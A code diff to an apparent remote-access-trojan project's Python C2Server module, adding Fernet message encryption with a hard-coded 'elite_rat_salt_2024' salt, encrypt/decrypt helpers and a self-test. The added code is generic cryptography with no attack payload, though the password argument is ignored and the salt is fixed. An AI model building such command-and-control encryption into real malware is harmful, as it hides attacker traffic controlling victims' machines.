@@ -14,6 +14,9 @@ import os
 import queue
 from datetime import datetime
 from typing import Dict, List, Any, Optional
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
 class C2Server:
     """
@@ -313,5 +316,100 @@ def test_c2_server():
     print("="*60)
 
 
+# ============================================================================
+# Encryption Functions
+# ============================================================================
+
+def generate_encryption_key(password: str = None) -> bytes:
+    """Generate encryption key from password or random"""
+    if password is None:
+        # Use a fixed key for testing (in production, store securely)
+        return Fernet.generate_key()
+    
+    # Derive key from password
+    salt = b'elite_rat_salt_2024'  # In production, use random salt
+    kdf = PBKDF2HMAC(
+        algorithm=hashes.SHA256(),
+        length=32,
+        salt=salt,
+        iterations=100000,
+    )
+    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
+    return key
+
+# Global key for testing (in production, use proper key management)
+_encryption_key = None
+
+def get_encryption_key() -> bytes:
+    """Get the encryption key (singleton pattern)"""
+    global _encryption_key
+    if _encryption_key is None:
+        _encryption_key = generate_encryption_key()
+    return _encryption_key
+
+def encrypt_message(message: Dict[str, Any], password: str = None) -> bytes:
+    """Encrypt a message using Fernet encryption"""
+    try:
+        key = get_encryption_key()
+        fernet = Fernet(key)
+        
+        # Convert message to JSON
+        message_json = json.dumps(message).encode()
+        
+        # Encrypt
+        encrypted = fernet.encrypt(message_json)
+        
+        return encrypted
+        
+    except Exception as e:
+        raise Exception(f"Encryption failed: {e}")
+
+def decrypt_message(encrypted_data: bytes, password: str = None) -> Dict[str, Any]:
+    """Decrypt a message using Fernet encryption"""
+    try:
+        key = get_encryption_key()
+        fernet = Fernet(key)
+        
+        # Decrypt
+        decrypted_json = fernet.decrypt(encrypted_data)
+        
+        # Parse JSON
+        message = json.loads(decrypted_json.decode())
+        
+        return message
+        
+    except Exception as e:
+        raise Exception(f"Decryption failed: {e}")
+
+def test_encryption():
+    """Test encryption/decryption functions"""
+    print("Testing encryption system...")
+    
+    test_message = {
+        'command': 'test',
+        'data': 'hello world',
+        'timestamp': datetime.now().isoformat()
+    }
+    
+    try:
+        # Test encryption
+        encrypted = encrypt_message(test_message)
+        print(f"✅ Encryption successful: {len(encrypted)} bytes")
+        
+        # Test decryption
+        decrypted = decrypt_message(encrypted)
+        print(f"✅ Decryption successful: {decrypted}")
+        
+        # Verify data integrity
+        if decrypted == test_message:
+            print("✅ Data integrity verified")
+        else:
+            print("❌ Data integrity failed")
+            
+    except Exception as e:
+        print(f"❌ Encryption test failed: {e}")
+
 if __name__ == "__main__":
+    test_encryption()
+    print("\n" + "="*60)
     test_c2_server()
